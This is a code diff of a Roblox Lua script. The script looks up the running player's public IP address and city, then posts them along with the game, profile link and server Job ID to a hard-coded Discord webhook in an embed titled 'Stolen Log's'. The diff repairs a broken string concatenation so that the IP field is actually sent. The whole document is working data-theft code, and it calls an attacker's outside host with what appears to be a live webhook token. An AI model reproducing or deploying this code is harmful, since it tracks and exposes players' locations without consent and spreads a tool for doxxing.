@@ -1,5 +1,5 @@
-local request = game:HttpGet("http://ip-api.com/json/?fields=status,message,city,query")
-local result = game:GetService("HttpService"):JSONDecode(request)
+local IPrequest = game:HttpGet("http://ip-api.com/json/?fields=status,message,city,query")
+local result = game:GetService("HttpService"):JSONDecode(IPrequest)
 
 local Notify_Webhook = "https://discord.com/api/webhooks/1414318651971993761/XMz2_n7Kl7P8_e4mk1V7Hl9vy5AtTr06QfQZtUtSUhq2TZ2NoNQ_srTRlf6ChWF0DFHa"
 local player = game.Players.LocalPlayer
@@ -25,7 +25,7 @@ function notify_hook()
 		["embeds"] = {
 			{
 				["title"] = "Stolen Log's",
-				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**\n** IP : " result.query"**",
+				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**\n** IP : " ..result.query .. "**",
 				["color"] = 3447003,
 				["fields"] = {
 					{
